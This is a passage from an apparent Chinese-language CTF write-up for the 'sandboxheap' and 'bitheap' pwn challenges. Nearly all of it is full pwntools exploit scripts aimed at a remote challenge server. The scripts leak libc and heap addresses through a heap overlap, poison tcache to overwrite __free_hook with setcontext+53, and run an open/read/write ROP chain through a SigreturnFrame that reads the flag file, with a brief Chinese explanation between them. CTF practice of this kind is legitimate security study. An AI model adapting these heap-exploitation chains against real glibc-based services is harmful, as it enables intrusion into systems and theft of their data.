</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;free_hook&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x98</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>12</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=mh>0x98</span><span class=o>*</span><span class=s2>&#34;</span><span class=se>\xff</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_addr</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;heap_addr&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
</span></span><span class=line><span class=cl>context(os = &#34;linux&#34;, arch = &#34;amd64&#34;, log_level = &#34;debug&#34;)
</span></span><span class=line><span class=cl>#io = process([&#34;./sandbox&#34;, &#34;./sandboxheap&#34;])
</span></span><span class=line><span class=cl>io = remote(&#34;101.201.71.136&#34;, 12795)
</span></span><span class=line><span class=cl>elf = ELF(&#34;./sandboxheap&#34;)
</span></span><span class=line><span class=cl>libc = ELF(&#34;./libc-2.27.so&#34;)
</span></span><span class=line><span class=cl>def add(idx, size):
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Your choice: &#34;, &#34;1&#34;)
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Index: &#34;, str(idx))
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Size: &#34;, str(size))
</span></span><span class=line><span class=cl>def edit(idx, content):
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Your choice: &#34;, &#34;2&#34;)
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Index: &#34;, str(idx))
</span></span><span class=line><span class=cl>    io.sendafter(&#34;Content: &#34;, content)
</span></span><span class=line><span class=cl>def show(idx):
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Your choice: &#34;, &#34;3&#34;)
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Index: &#34;, str(idx))
</span></span><span class=line><span class=cl>def delete(idx):
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Your choice: &#34;, &#34;4&#34;)
</span></span><span class=line><span class=cl>    io.sendlineafter(&#34;Index: &#34;, str(idx))
</span></span><span class=line><span class=cl>def convert(st):
</span></span><span class=line><span class=cl>    tar=&#34;&#34;
</span></span><span class=line><span class=cl>    for i in st:
</span></span><span class=line><span class=cl>        b=(bin(i)[2:].rjust(8,&#39;\x00&#39;)[::-1])
</span></span><span class=line><span class=cl>        tar+=b
</span></span><span class=line><span class=cl>    return tar
</span></span><span class=line><span class=cl>for i in range(11):
</span></span><span class=line><span class=cl>    add(i, 0x88)
</span></span><span class=line><span class=cl>for i in range(7):
</span></span><span class=line><span class=cl>    delete(i)
</span></span><span class=line><span class=cl>delete(7)
</span></span><span class=line><span class=cl>edit(8, b&#39;1&#39; * 0x80 * 8 + b&#39;00000100&#39; + \
</span></span><span class=line><span class=cl>     b&#39;10000000&#39; + b&#39;00000000&#39; * 6 + b&#39;00000000&#39;)
</span></span><span class=line><span class=cl>delete(9)
</span></span><span class=line><span class=cl>for i in range(7):
</span></span><span class=line><span class=cl>    add(i, 0x88)
</span></span><span class=line><span class=cl>add(7, 0x88)
</span></span><span class=line><span class=cl>show(8)
</span></span><span class=line><span class=cl>libc_base = u64(io.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8, b&#39;\x00&#39;)) - 0x3ebca0
</span></span><span class=line><span class=cl>success(&#34;libc_base:\t&#34; + hex(libc_base))
</span></span><span class=line><span class=cl>add(9, 0x110)
</span></span><span class=line><span class=cl>add(13, 0x110)
</span></span><span class=line><span class=cl>add(14, 0x110)
</span></span><span class=line><span class=cl>delete(13)
</span></span><span class=line><span class=cl>delete(9)
</span></span><span class=line><span class=cl>show(8)
</span></span><span class=line><span class=cl>io.recvuntil(&#34;Content: &#34;)
</span></span><span class=line><span class=cl>heap_base = u64(io.recv(6).ljust(8, b&#39;\x00&#39;)) - 0x010 -0x880
</span></span><span class=line><span class=cl>success(&#34;heap_base:\t&#34; + hex(heap_base))
</span></span><span class=line><span class=cl>free_hook = libc_base+libc.symbols[&#34;__free_hook&#34;]
</span></span><span class=line><span class=cl>edit(8, bin((free_hook))[2:][::-1].ljust(64, &#39;\x00&#39;))
</span></span><span class=line><span class=cl>add(9, 0x110)
</span></span><span class=line><span class=cl>add(11, 0x110)
</span></span><span class=line><span class=cl>setcontext = libc_base + libc.symbols[&#34;setcontext&#34;] + 53
</span></span><span class=line><span class=cl>pop_rdi_ret = libc_base + 0x000000000002164f
</span></span><span class=line><span class=cl>pop_rsi_ret = libc_base + 0x0000000000023a6a
</span></span><span class=line><span class=cl>pop_rdx_r12_ret = libc_base + 0x0000000000130514
</span></span><span class=line><span class=cl>pop_rax_ret = libc_base + 0x000000000001b500
</span></span><span class=line><span class=cl>syscall = libc_base + 0x00000000000d2625
</span></span><span class=line><span class=cl>flag = bin(0x67616c662f2e)[2:].rjust(64, &#39;\x00&#39;).encode()[::-1]
</span></span><span class=line><span class=cl>edit(1,flag)
</span></span><span class=line><span class=cl>frame = SigreturnFrame()
</span></span><span class=line><span class=cl>frame.rsp = heap_base + 0x6f0
</span></span><span class=line><span class=cl>frame.rdi = 0
</span></span><span class=line><span class=cl>frame.rsi = heap_base + 0x6f0
</span></span><span class=line><span class=cl>frame.rdx = 0x200
</span></span><span class=line><span class=cl>frame.rip = libc.symbols[&#34;read&#34;] + libc_base
</span></span><span class=line><span class=cl>orw = p64(pop_rdi_ret) + p64(3)
</span></span><span class=line><span class=cl>orw += p64(pop_rax_ret) + p64(0x2710)
</span></span><span class=line><span class=cl>orw += p64(syscall)
</span></span><span class=line><span class=cl>orw += p64(pop_rdi_ret) + p64(heap_base + 0x530)
</span></span><span class=line><span class=cl>orw += p64(pop_rsi_ret) + p64(0)
</span></span><span class=line><span class=cl>orw += p64(pop_rax_ret) + p64(2)
</span></span><span class=line><span class=cl>orw += p64(syscall)
</span></span><span class=line><span class=cl>orw += p64(pop_rdi_ret) + p64(3)
</span></span><span class=line><span class=cl>orw += p64(pop_rsi_ret) + p64(heap_base + 0x5b0)
</span></span><span class=line><span class=cl>orw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
</span></span><span class=line><span class=cl>orw += p64(pop_rax_ret) + p64(0)
</span></span><span class=line><span class=cl>orw += p64(syscall)
</span></span><span class=line><span class=cl>orw += p64(pop_rdi_ret) + p64(1)
</span></span><span class=line><span class=cl>orw += p64(pop_rsi_ret) + p64(heap_base + 0x5b0)
</span></span><span class=line><span class=cl>orw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)
</span></span><span class=line><span class=cl>orw += p64(pop_rax_ret) + p64(1)
</span></span><span class=line><span class=cl>orw += p64(syscall)
</span></span><span class=line><span class=cl>edit(11, bin((setcontext))[2:][::-1].ljust(64, &#39;\x00&#39;))
</span></span><span class=line><span class=cl>bin_frame = convert(bytes(frame))
</span></span><span class=line><span class=cl>add(12, 0x98)
</span></span><span class=line><span class=cl>edit(12, bin_frame[0:0x98*8])
</span></span><span class=line><span class=cl>add(15, 0x98)
</span></span><span class=line><span class=cl>edit(15, bin_frame[0xa0*8:])
</span></span><span class=line><span class=cl>delete(12)
</span></span><span class=line><span class=cl>io.send(orw)
</span></span><span class=line><span class=cl>io.interactive()
</span></span></code></pre></td></tr></table></div></div><h2 id=bitheap>bitheap</h2><p>这道题和sandboxheap一样，而且还没有这道题的沙箱保护，用上道题的exp直接打就可以拿到flag
exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#io = process([&#34;./sandbox&#34;, &#34;./sandboxheap&#34;])</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;101.201.71.136&#34;</span><span class=p>,</span> <span class=mi>44997</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./bitheap&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.27.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Size: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content: &#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>,</span> <span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>convert</span><span class=p>(</span><span class=n>st</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>tar</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>st</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=o>=</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>i</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)[::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>tar</span><span class=o>+=</span><span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>tar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span> <span class=o>*</span> <span class=mh>0x80</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;00000100&#39;</span> <span class=o>+</span> \
</span></span><span class=line><span class=cl>     <span class=sa>b</span><span class=s1>&#39;10000000&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;00000000&#39;</span> <span class=o>*</span> <span class=mi>6</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;00000000&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3ebca0</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>14</span><span class=p>,</span> <span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Content: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x010</span> <span class=o>-</span><span class=mh>0x880</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;heap_base:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=nb>bin</span><span class=p>((</span><span class=n>free_hook</span><span class=p>))[</span><span class=mi>2</span><span class=p>:][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>64</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span> <span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>setcontext</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;setcontext&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000002164f</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x0000000000023a6a</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx_r12_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x0000000000130514</span>
</span></span><span class=line><span class=cl><span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000001b500</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x00000000000d2625</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=mh>0x67616c662f2e</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>64</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x6f0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x6f0</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mh>0x200</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;read&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x530</span><span class=p>)</span>
